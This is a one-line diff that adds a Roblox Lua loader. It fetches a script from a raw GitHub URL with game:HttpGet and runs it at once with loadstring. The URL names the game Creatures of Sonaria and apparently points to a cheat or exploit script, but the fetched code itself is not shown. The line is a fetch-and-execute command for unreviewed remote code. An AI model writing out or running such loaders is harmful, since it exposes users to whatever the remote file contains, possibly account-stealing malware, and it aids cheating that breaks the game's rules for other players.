@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/creatures-of-sonaria-survive-kaiju-anima-spam6-8854c0rco8m4u9.lua"))()
